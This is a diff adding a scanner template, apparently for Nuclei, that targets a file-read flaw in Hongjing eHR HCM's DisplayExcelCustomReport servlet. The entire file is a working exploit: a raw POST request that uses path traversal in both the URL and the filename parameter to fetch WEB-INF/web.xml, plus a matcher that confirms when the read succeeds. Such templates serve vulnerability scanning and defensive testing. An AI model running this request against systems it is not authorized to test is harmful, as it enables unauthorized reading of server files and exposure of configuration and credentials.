@@ -1,0 +1,26 @@
+id: Hongjing-HCM-DisplayExcelCustomReport-fileread
+ 
+info:
+  name: 宏景-eHR-hcm-DisplayExcelCustomReport-文件读取
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+    
+http:
+  - raw:
+      - |
+        POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        filename=../webapps/ROOT/WEB-INF/web.xml
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200 && contains_all(body,'<?xml')"
